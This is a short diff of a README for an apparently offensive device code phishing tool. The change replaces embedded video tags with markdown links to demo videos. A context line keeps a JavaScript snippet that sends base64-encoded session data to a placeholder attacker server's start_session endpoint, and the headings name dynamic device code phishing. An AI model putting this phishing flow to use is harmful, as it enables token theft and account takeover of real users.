@@ -59,10 +59,7 @@ Other way to use is to start the flask server which will listen for token detail
 
 #### Video Demo 1 (Normal Generate Token)
 
-<video width="640" height="480" controls>
-  <source src="videos/generate_device_code.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+[![Watch the video](images/image.png)](video/generate_device_code.mp4)
 
 
 ### Dynamic Device Code Phishing
@@ -89,10 +86,10 @@ document.getElementById('code').innerHTML += data.message;
 $.get("https://<Server Name>:<port>/start_session?tok=" + base64EncodedData);
 ```
 
-<video width="640" height="480" controls>
-  <source src="video/dynamic_device_code.mp4" type="video/mp4">
-  Your browser does not support the video tag.
-</video>
+#### Video Demo 2 (Dynamic Device Code Phishing)
+
+[![Watch the video](images/image.png)](video/dynamic_device_code.mp4)
+
 
 
 
